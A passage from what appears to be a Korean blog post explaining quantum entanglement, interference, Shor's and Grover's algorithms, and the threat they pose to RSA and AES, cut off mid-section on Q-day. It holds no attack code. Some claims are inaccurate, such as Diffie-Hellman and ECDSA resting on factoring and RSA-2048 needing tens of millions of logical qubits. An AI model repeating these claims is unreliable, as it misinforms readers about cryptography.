&#xBCD1;&#xB82C;&#xC801;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xB418;&#xACE0;, &#xC815;&#xBCF4;&#xC758; &#xC0C1;&#xAD00;&#xAD00;&#xACC4;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xD2B9;&#xC815; &#xACC4;&#xC0B0; &#xACB0;&#xACFC;&#xB97C; &#xAC15;&#xD654;&#xD558;&#xAC70;&#xB098; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xC5EC; &#xC815;&#xB2F5;&#xC774; &#xB418;&#xB294; &#xD328;&#xD134;&#xC744; &#xAC15;&#xD654;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C; &#xC5BD;&#xD78C; &#xD050;&#xBE44;&#xD2B8; &#xC30D; &#xC911; &#xD558;&#xB098;&#xB97C; &#xCE21;&#xC815;&#xD558;&#xBA74;, &#xB2E4;&#xB978; &#xD050;&#xBE44;&#xD2B8;&#xC758; &#xC0C1;&#xD0DC;&#xAC00; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xACB0;&#xC815;&#xB418;&#xBBC0;&#xB85C; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC815;&#xBCF4; &#xC804;&#xB2EC;, &#xC0C1;&#xD0DC; &#xC81C;&#xC5B4;, &#xC624;&#xB958; &#xC815;&#xC815; &#xAC19;&#xC740; &#xACE0;&#xAE09; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7F0; &#xC5BD;&#xD798; &#xD604;&#xC0C1;&#xC740; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xBCD1;&#xB82C; &#xCC98;&#xB9AC;&#xB97C; &#xB118;&#xC5B4;&#xC11C; &#xB17C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xB41C; &#xC5F0;&#xC0B0;&#xB9DD;&#xC744; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xB290; &#xAE30;&#xBC18;&#xC774; &#xB3FC;&#xC694;.</p><h3 id="2-3-&#xC591;&#xC790;-&#xAC04;&#xC12D;-Interference"><a href="#2-3-&#xC591;&#xC790;-&#xAC04;&#xC12D;-Interference" class="headerlink" title="2.3 &#xC591;&#xC790; &#xAC04;&#xC12D; (Interference)"></a>2.3 &#xC591;&#xC790; &#xAC04;&#xC12D; (Interference)</h3><p>&#xC591;&#xC790; &#xAC04;&#xC12D;&#xC740; &#xC911;&#xCCA9; &#xC0C1;&#xD0DC;&#xC5D0; &#xC788;&#xB294; &#xC5EC;&#xB7EC; &#xACBD;&#xB85C; &#xC911;&#xC5D0;&#xC11C; &#xC815;&#xB2F5;&#xC73C;&#xB85C; &#xD5A5;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xC758; &#xD655;&#xB960;&#xC744; &#xAC15;&#xD654;&#xD558;&#xACE0;, &#xC798;&#xBABB;&#xB41C; &#xACBD;&#xB85C;&#xC758; &#xD655;&#xB960;&#xC744; &#xC57D;&#xD654;&#xC2DC;&#xD0A4;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC591;&#xC790; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xC774; &#xAC04;&#xC12D;&#xC744; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xC870;&#xC815;&#xD558;&#xC5EC; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC62C;&#xBC14;&#xB978; &#xACB0;&#xACFC;&#xAC00; &#xB354; &#xB192;&#xC740; &#xD655;&#xB960;&#xB85C; &#xAD00;&#xCE21;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C; &#xADF8;&#xB85C;&#xBC84;(Grover) &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC5D0;&#xC11C;&#xB294; &#xBAA8;&#xB4E0; &#xAC00;&#xB2A5;&#xD55C; &#xD574; &#xC911;&#xC5D0;&#xC11C; &#xC62C;&#xBC14;&#xB978; &#xD574;&#xC758; &#xD655;&#xB960;&#xC744; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xAC15;&#xD654;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574;&#xC11C; N&#xAC1C;&#xC758; &#xB370;&#xC774;&#xD130; &#xC911;&#xC5D0;&#xC11C; &#xC815;&#xB2F5;&#xC744; &#xCC3E;&#xB294;&#xB370;&#xC5D0; &#xACE0;&#xC804;&#xC801;&#xC73C;&#xB85C;&#xB294; O(N) &#xC591;&#xC790; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; O(&#x221A;n)&#xB9CC;&#xC5D0; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC591;&#xC790; &#xC911;&#xCCA9;&#xC774; &#xACC4;&#xC0B0;&#xC758; &#xD3ED;&#xC744; &#xB113;&#xD788;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD55C;&#xB2E4;&#xBA74; &#xC591;&#xC790; &#xAC04;&#xC12D;&#xC740; &#xADF8; &#xD3ED; &#xC911;&#xC5D0;&#xC11C; &#xC815;&#xB2F5;&#xB9CC; &#xB0A8;&#xAE30;&#xB294; &#xD544;&#xD130; &#xC5ED;&#xD560;&#xC744; &#xD55C;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="3-&#xC591;&#xC790;-&#xC54C;&#xACE0;&#xB9AC;&#xC998;"><a href="#3-&#xC591;&#xC790;-&#xC54C;&#xACE0;&#xB9AC;&#xC998;" class="headerlink" title="3. &#xC591;&#xC790; &#xC54C;&#xACE0;&#xB9AC;&#xC998;"></a>3. &#xC591;&#xC790; &#xC54C;&#xACE0;&#xB9AC;&#xC998;</h2><p>&#xC55E;&#xC5D0;&#xC11C; &#xC0B4;&#xD3B4;&#xBD24;&#xB358; &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;&#xC758; &#xD2B9;&#xC131;&#xB4E4;(&#xC911;&#xCCA9;, &#xC5BD;&#xD798;, &#xAC04;&#xC12D;)&#xC740; &#xB2E8;&#xC21C;&#xD788; &#x2018;&#xC2E0;&#xAE30;&#xD55C; &#xBB3C;&#xB9AC; &#xD604;&#xC0C1;&#x2019;&#xC73C;&#xB85C; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC544;&#xC694;. &#xC774; &#xD2B9;&#xC131;&#xB4E4;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xACE0;&#xC804; &#xCEF4;&#xD4E8;&#xD130;&#xB85C;&#xB294; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6B4; &#xBB38;&#xC81C;&#xB97C; &#xD6E8;&#xC52C; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xD480; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB7EC;&#xD55C; &#xC591;&#xC790; &#xACC4;&#xC0B0;&#xC758; &#xAC00;&#xB2A5;&#xC131;&#xC744; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xB300;&#xD45C;&#xC801;&#xC778; &#xC608;&#xC2DC;&#xAC00; &#xC1FC;&#xC5B4;(Shor) &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xACFC; &#xADF8;&#xB85C;&#xBC84;(Grover) &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774;&#xC5D0;&#xC694;. &#xC774; &#xB450; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#x201C;&#xACE0;&#xC804; &#xC554;&#xD638;&#xB97C; &#xAE68;&#xAE30; &#xC704;&#xD574;&#x201D; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xAC74; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC;, &#xADF8; &#xACC4;&#xC0B0; &#xC6D0;&#xB9AC;&#xAC00; &#xACB0;&#xAD6D; &#xC6B0;&#xB9AC;&#xAC00; &#xC9C0;&#xAE08; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC554;&#xD638; &#xCCB4;&#xACC4;&#xC758; &#xC548;&#xC804;&#xC131;&#xC744; &#xD754;&#xB4E4;&#xC5B4;&#xBC84;&#xB838;&#xC5B4;&#xC694;.</p><h3 id="3-1-&#xC1FC;&#xC5B4;-Shor-&#xC54C;&#xACE0;&#xB9AC;&#xC998;"><a href="#3-1-&#xC1FC;&#xC5B4;-Shor-&#xC54C;&#xACE0;&#xB9AC;&#xC998;" class="headerlink" title="3.1 &#xC1FC;&#xC5B4;(Shor) &#xC54C;&#xACE0;&#xB9AC;&#xC998;"></a>3.1 &#xC1FC;&#xC5B4;(Shor) &#xC54C;&#xACE0;&#xB9AC;&#xC998;</h3><p>&#xC1FC;&#xC5B4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; 1994&#xB144; Peter Shor&#xAC00; &#xC81C;&#xC548;&#xD55C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC73C;&#xB85C;, <strong>&#xB2E4;&#xD56D; &#xC2DC;&#xAC04; &#xC548;&#xC5D0; &#xC18C;&#xC778;&#xC218;&#xBD84;&#xD574;</strong>&#xB97C; &#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xACE0;&#xC804; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xC11C;&#xB294; &#xD070; &#xC218;&#xC77C;&#xC218;&#xB85D; &#xC18C;&#xC778;&#xC218;&#xBD84;&#xD574;&#xAC00; &#xC5C4;&#xCCAD;&#xB098;&#xAC8C; &#xC5B4;&#xB824;&#xC6CC;&#xC9C0;&#xACE0;, 2048 &#xBE44;&#xD2B8;&#xC9DC;&#xB9AC; RSA &#xD0A4;&#xB97C; &#xD480;&#xB824;&#xBA74; &#xC218;&#xC2ED;&#xC5B5;&#xB144;&#xC774; &#xAC78;&#xB9B4; &#xC815;&#xB3C4;&#xB85C; &#xBE44;&#xD604;&#xC2E4;&#xC801;&#xC774;&#xC9C0;&#xB9CC;, &#xC1FC;&#xC5B4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xB2E4;&#xD56D; &#xC2DC;&#xAC04; &#xC548;&#xC5D0; &#xB05D;&#xB0BC; &#xC218; &#xC788;&#xC74C;&#xC744; &#xC99D;&#xBA85;&#xD588;&#xC5B4;&#xC694;.</p><p>&#xC791;&#xB3D9; &#xC6D0;&#xB9AC;&#xB294; &#xC870;&#xAE08; &#xBCF5;&#xC7A1;&#xD558;&#xC9C0;&#xB9CC; &#xAC04;&#xB2E8;&#xD788; &#xB9D0;&#xD558;&#xBA74;, &#xC591;&#xC790; &#xD478;&#xB9AC;&#xC5D0; &#xBCC0;&#xD658;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xC218;&#xC5F4;&#xC758; &#xC8FC;&#xAE30;&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xCC3E;&#xC544;&#xB0B4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC8FC;&#xAE30;&#xB97C; &#xC54C;&#xBA74; &#xC815;&#xBCF4;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC790;&#xC5F0;&#xC2A4;&#xB7FD;&#xAC8C; &#xC18C;&#xC778;&#xC218;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xAC70;&#xB4E0;&#xC694;. </p><p><img src="/2025/10/12/bekim/quantum_computer/ko/image3.png" alt></p><p>&#xC774; &#xADF8;&#xB9BC;&#xC740; &#xC1FC;&#xC5B4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC758; &#xAE30;&#xBCF8; &#xAD6C;&#xC870;&#xB97C; &#xB2E8;&#xC21C;&#xD654;&#xD574;&#xC11C; &#xD45C;&#xD604;&#xD55C; &#xD68C;&#xB85C;&#xC778;&#xB370;&#xC694;. &#xC67C;&#xCABD;&#xC758; &#xD050;&#xBE44;&#xD2B8;&#xB4E4;&#xC740; &#xC785;&#xB825; &#xC0C1;&#xD0DC;&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xACE0; Hadamard &#xAC8C;&#xC774;&#xD2B8;(H)&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC911;&#xCCA9; &#xC0C1;&#xD0DC;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC918;&#xC694;. &#xADF8; &#xB2E4;&#xC74C;&#xC5D0; &#xAC01; &#xD050;&#xBE44;&#xD2B8;&#xB4E4;&#xC774; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xAC70;&#xB4ED;&#xC81C;&#xACF1; &#xD615;&#xD0DC;&#xC758; Ua^{2^{n-1}}&#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74;&#xC11C;, &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xC5F4;&#xC758; &#xC8FC;&#xAE30;&#xC131;&#xC744; &#xBC18;&#xC601;&#xD558;&#xB294; &#xC704;&#xC0C1; &#xC815;&#xBCF4;&#xB97C; &#xC5BB;&#xAC8C; &#xB418;&#xACE0;, &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC5ED; &#xC591;&#xC790; &#xD478;&#xB9AC;&#xC5D0; &#xBCC0;&#xD658;(QFT&#x207B;&#xB9;)&#xC744; &#xC801;&#xC6A9;&#xD574;&#xC11C; &#xC8FC;&#xAE30; &#xC815;&#xBCF4;&#xB97C; &#xCE21;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; &#xD615;&#xD0DC;&#xB85C; &#xBCC0;&#xD658;&#xD574;&#xC694;.</p><p>&#xC0AC;&#xC2E4; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC27D;&#xAC8C; &#xC124;&#xBA85;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6B8; &#xAC83; &#xAC19;&#xC544;&#xC694;. &#xC608;&#xC804;&#xC5D0; &#xC591;&#xC790; &#xC554;&#xD638;&#xD559; &#xC2DC;&#xD5D8;&#xC5D0;&#xC11C; &#xC1FC;&#xC5B4; &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xC591;&#xC790; &#xD68C;&#xB85C; &#xC99D;&#xBA85;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC5C8;&#xB294;&#xB370;, B+ &#xB9DE;&#xC558;&#xAC70;&#xB4E0;&#xC694;. </p><p>&#xC544;&#xBB34;&#xD2BC; &#xC774;&#xAC8C; &#xC65C; &#xC911;&#xC694;&#xD558;&#xB0D0;&#xBA74;, RSA, Diffie&#x2013;Hellman, ECDSA &#xAC19;&#xC740; <strong>&#xAC70;&#xC758; &#xBAA8;&#xB4E0; &#xACF5;&#xAC1C;&#xD0A4; &#xC554;&#xD638;&#xCCB4;&#xACC4;&#xAC00; &#x2018;&#xC18C;&#xC778;&#xC218;&#xBD84;&#xD574;&#xAC00; &#xC5B4;&#xB835;&#xB2E4;&#x2019;&#xB294; &#xAC00;&#xC815;</strong> &#xC704;&#xC5D0;&#xC11C; &#xB3CC;&#xC544;&#xAC00;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC5D0;&#xC694;. &#xC989;, &#xC1FC;&#xC5B4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xD604;&#xC2E4;&#xD654;&#xB41C;&#xB2E4;&#xBA74;, &#xC6B0;&#xB9AC;&#xAC00; &#xC9C0;&#xAE08; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC778;&#xD130;&#xB137; &#xBCF4;&#xC548;&#xC5D0; &#xC704;&#xD611;&#xC774; &#xB420; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xBB3C;&#xB860; &#xC774;&#xB860;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xC815;&#xB9D0; &#xAC15;&#xB825;&#xD558;&#xC9C0;&#xB9CC;, &#xD604;&#xC2E4;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xC9C1; &#xADF8;&#xB807;&#xAC8C; &#xB9CE;&#xC740; &#xC548;&#xC815;&#xC801;&#xC778; &#xB17C;&#xB9AC; &#xD050;&#xBE44;&#xD2B8;(logical qubit)&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xC9C0; &#xBABB;&#xD588;&#xC5B4;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xB2F9;&#xC7A5;&#xC740; RSA&#xB97C; &#xBC14;&#xB85C; &#xAE68;&#xB294; &#xC218;&#xC900;&#xC740; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC;, &#xC5B8;&#xC820;&#xAC00;&#xB294; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xC810; &#xB54C;&#xBB38;&#xC5D0; &#xD559;&#xACC4;&#xC5D0;&#xC11C;&#xB294; &#xC591;&#xC790; &#xB0B4;&#xC131; &#xC554;&#xD638;(PQC)&#xB85C;&#xC758; &#xC804;&#xD658;&#xB3C4; &#xD65C;&#xBC1C;&#xD788; &#xC5F0;&#xAD6C;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;. PQC&#xB294; &#xB610; &#xD558;&#xB098;&#xC758; &#xD070; &#xC8FC;&#xC81C;&#xC77C; &#xAC83; &#xAC19;&#xC544;&#xC11C; &#xB098;&#xC911;&#xC5D0; &#xAE30;&#xD68C;&#xAC00; &#xC788;&#xC73C;&#xBA74; &#xB2E4;&#xB904;&#xBCFC;&#xAC8C;&#xC694;. </p><h3 id="3-2-&#xADF8;&#xB85C;&#xBC84;-Grover-&#xC54C;&#xACE0;&#xB9AC;&#xC998;"><a href="#3-2-&#xADF8;&#xB85C;&#xBC84;-Grover-&#xC54C;&#xACE0;&#xB9AC;&#xC998;" class="headerlink" title="3.2 &#xADF8;&#xB85C;&#xBC84;(Grover) &#xC54C;&#xACE0;&#xB9AC;&#xC998;"></a>3.2 &#xADF8;&#xB85C;&#xBC84;(Grover) &#xC54C;&#xACE0;&#xB9AC;&#xC998;</h3><p>&#xADF8;&#xB85C;&#xBC84; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; <strong>&#xBE44;&#xC815;&#xB82C; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xD56D;&#xBAA9;&#xC744; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xCC3E;&#xC544;&#xB0B4;&#xB294; &#xC54C;&#xACE0;&#xB9AC;&#xC998;</strong>&#xC774;&#xC5D0;&#xC694;. &#xB9CC;&#xC57D; &#xC5B4;&#xB5A4; &#xBB38;&#xC81C;&#xC758; &#xB2F5;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xAC00;&#xB2A5;&#xD55C; &#xBAA8;&#xB4E0; &#xACBD;&#xC6B0;&#xB97C; &#xD558;&#xB098;&#xC529; &#xC2DC;&#xB3C4;&#xD574;&#xBCF8;&#xB2E4;&#xACE0; &#xD560; &#xB54C; &#xACE0;&#xC804;&#xC801;&#xC778; &#xBC29;&#xC2DD;&#xC5D0;&#xC11C;&#xB294; N&#xAC1C;&#xC758; &#xD6C4;&#xBCF4;&#xAC00; &#xC788;&#xC73C;&#xBA74; &#xD3C9;&#xADE0;&#xC801;&#xC73C;&#xB85C; N/2&#xBC88; &#xC2DC;&#xB3C4;&#xD574;&#xC57C; &#xC815;&#xB2F5;&#xC744; &#xCC3E;&#xC9C0;&#xB9CC;, &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xADF8;&#xB85C;&#xBC84; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD1B5;&#xD574; &#xC57D; &#x221A;N&#xBC88;&#xB9CC;&#xC5D0; &#xC815;&#xB2F5;&#xC744; &#xCC3E;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC774;&#xAC8C; &#xAC00;&#xB2A5;&#xD55C; &#xC774;&#xC720;&#xB294; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xC911;&#xCCA9;(superposition)&#xACFC; &#xAC04;&#xC12D;(interference)&#xC744; &#xC774;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC5D0;&#xC694;. </p><p>&#xADF8;&#xB85C;&#xBC84; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC5D0;&#xC11C;&#xB294; &#xAC00;&#xB2A5;&#xD55C; &#xBAA8;&#xB4E0; &#xC0C1;&#xD0DC;&#xB97C; &#xD55C;&#xAEBC;&#xBC88;&#xC5D0; &#xC911;&#xCCA9;&#xC2DC;&#xCF1C;&#xC11C;, &#xBAA8;&#xB4E0; &#xD6C4;&#xBCF4;&#xAC00; &#xB3D9;&#xC2DC;&#xC5D0; &#xACC4;&#xC0B0;&#xC5D0; &#xCC38;&#xC5EC;&#xD558;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8; &#xB2E4;&#xC74C;, &#xC815;&#xB2F5; &#xC0C1;&#xD0DC;&#xB9CC; &#xC704;&#xC0C1;&#xC744; &#xBC18;&#xC804;&#xC2DC;&#xCF1C; &#xD45C;&#xC2DC;&#xD558;&#xB294; &#xC624;&#xB77C;&#xD074; &#xC5F0;&#xC0B0;&#xC744; &#xC801;&#xC6A9;&#xD558;&#xACE0;, &#xAC04;&#xC12D;&#xC744; &#xD1B5;&#xD574; &#xC815;&#xB2F5;&#xC758; &#xD655;&#xB960; &#xC9C4;&#xD3ED;&#xB9CC; &#xD06C;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC8FC;&#xB294; &#xACFC;&#xC815;&#xC744; &#xBC18;&#xBCF5;&#xD574;&#xC694;. &#xADF8;&#xB7FC; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xCE21;&#xC815;&#xD558;&#xBA74; &#xC815;&#xB2F5;&#xC77C; &#xD655;&#xB960;&#xC774; &#xAC00;&#xC7A5; &#xB192;&#xC740; &#xC0C1;&#xD0DC;&#xAC00; &#xB0A8;&#xAC8C; &#xB418;&#xB294; &#xAC70;&#xC8E0;.</p><p>&#xC774;&#xB7F0; &#xD2B9;&#xC131; &#xB355;&#xBD84;&#xC5D0; &#xADF8;&#xB85C;&#xBC84; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xB300;&#xADDC;&#xBAA8; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xAC80;&#xC0C9;&#xC774;&#xB098;, &#xBA38;&#xC2E0; &#xB7EC;&#xB2DD; &#xBB38;&#xC81C; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xBD84;&#xC57C;&#xC758; &#xC751;&#xC6A9; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC544;&#xC694;. </p><p>&#xD558;&#xC9C0;&#xB9CC; &#xB3D9;&#xC2DC;&#xC5D0; &#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xB098; &#xD574;&#xC2DC; &#xAE30;&#xBC18; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xBCF4;&#xC548; &#xAC15;&#xB3C4;&#xB97C; &#xC808;&#xBC18;&#xC73C;&#xB85C; &#xB0AE;&#xCD9C; &#xC218; &#xC788;&#xB294; &#xC704;&#xD611;&#xC774;&#xAE30;&#xB3C4; &#xD574;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C; AES-128 &#xC554;&#xD638;&#xB97C; &#xBE0C;&#xB8E8;&#xD2B8;&#xD3EC;&#xC2A4; &#xD558;&#xB824;&#xBA74; &#xACE0;&#xC804;&#xC801;&#xC73C;&#xB85C;&#xB294; 2^128&#xBC88;&#xC744; &#xC2DC;&#xB3C4;&#xD574;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; 2^64&#xBC88; &#xB9CC;&#xC5D0; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xACC4;&#xC0B0;&#xC774; &#xB098;&#xC640;&#xC694;.</p><p>&#xBB3C;&#xB860; &#xADF8;&#xB85C;&#xBC84; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xC1FC;&#xC5B4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xCC98;&#xB7FC; &#xACF5;&#xAC1C;&#xD0A4; &#xC554;&#xD638;&#xB97C; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xBB34;&#xB108;&#xB728;&#xB9AC;&#xC9C0;&#xB294; &#xC54A;&#xC9C0;&#xB9CC;, &#x2018;&#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xACF5;&#xAC1C;&#xD0A4; &#xC554;&#xD638;&#xB9CC; &#xC704;&#xD611;&#xD558;&#xB294; &#xAC8C; &#xC544;&#xB2C8;&#xB77C;, &#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xC5D0;&#xB3C4; &#xC601;&#xD5A5;&#xC744; &#xC900;&#xB2E4;&#x2019;&#xB294; &#xC810;&#xC744; &#xBA85;&#xD655;&#xD788; &#xBCF4;&#xC5EC;&#xC92C;&#xC5B4;&#xC694; . &#xADF8;&#xB798;&#xC11C; &#xBCF4;&#xC548; &#xC5C5;&#xACC4;&#xC5D0;&#xC11C;&#xB294; <strong>AES-256&#xCC98;&#xB7FC; &#xAE34; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xAD8C;&#xC7A5;</strong>&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB85C;&#xBC84; &#xACF5;&#xACA9;&#xC744; &#xAC10;&#xC548;&#xD558;&#xB354;&#xB77C;&#xB3C4; AES-256&#xC740; &#xC5EC;&#xC804;&#xD788; &#xCDA9;&#xBD84;&#xD788; &#xC548;&#xC804;&#xD558;&#xB2C8;&#xAE4C;&#xC694;.</p><h2 id="4-Q-day"><a href="#4-Q-day" class="headerlink" title="4. Q-day"></a>4. Q-day</h2><p>&#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xD604;&#xC7AC;&#xC758; &#xC554;&#xD638;&#xB97C; &#xC2E4;&#xC81C;&#xB85C; &#xD574;&#xB3C5;&#xD560; &#xC218; &#xC788;&#xB294; &#xB0A0;, <strong>Q-Day(Quantum Day)</strong> &#xAC00; &#xC5B8;&#xC81C; &#xC62C;&#xC9C0;&#xB294; &#xC544;&#xBB34;&#xB3C4; &#xC815;&#xD655;&#xD788; &#xC608;&#xCE21;&#xD560; &#xC218; &#xC5C6;&#xC5B4;&#xC694;. &#xD558;&#xC9C0;&#xBA74; &#xD604;&#xC7AC; &#xC6B0;&#xB9AC;&#xAC00; &#xC788;&#xB294; &#xB2E8;&#xACC4;&#xB294; NISQ(Noisy Intermediate-Scale Quantum) &#xC2DC;&#xB300;&#xC5D0;&#xC694;. </p><p>&#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xC7A1;&#xC74C;&#xC774; &#xB9CE;&#xC740; &#xC911;&#xAC04; &#xB2E8;&#xACC4;&#xC758; &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130; &#xC2DC;&#xB300;&#xC785;&#xB2C8;&#xB2E4;. &#xC804; &#xC138;&#xACC4; &#xC720;&#xC218; IT &#xAE30;&#xC5C5;&#xB4E4;&#xC740; &#xC218;&#xBC31; &#xAC1C;&#xC758; &#xD050;&#xBE44;&#xD2B8;&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xAE34; &#xD588;&#xC9C0;&#xB9CC;, &#xC5EC;&#xC804;&#xD788; &#xBD88;&#xC548;&#xC815;&#xD558;&#xACE0; &#xC624;&#xB958;&#xC728;&#xC774; &#xB192;&#xC544;&#xC11C; RSA&#xB97C; &#xAE68;&#xAE30;&#xC5D0;&#xB294; &#xBD80;&#xC871;&#xD55C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC694;. RSA-2048&#xC744; &#xC644;&#xC804;&#xD788; &#xAE68;&#xB824;&#xBA74; &#xC218;&#xCC9C;&#xB9CC; &#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xC548;&#xC815;&#xC801;&#xC778; &#xB17C;&#xB9AC; &#xD050;&#xBE44;&#xD2B8;(logical qubit)&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xC54C;&#xB824;&#xC838; &#xC788;&#xC9C0;&#xB9CC; 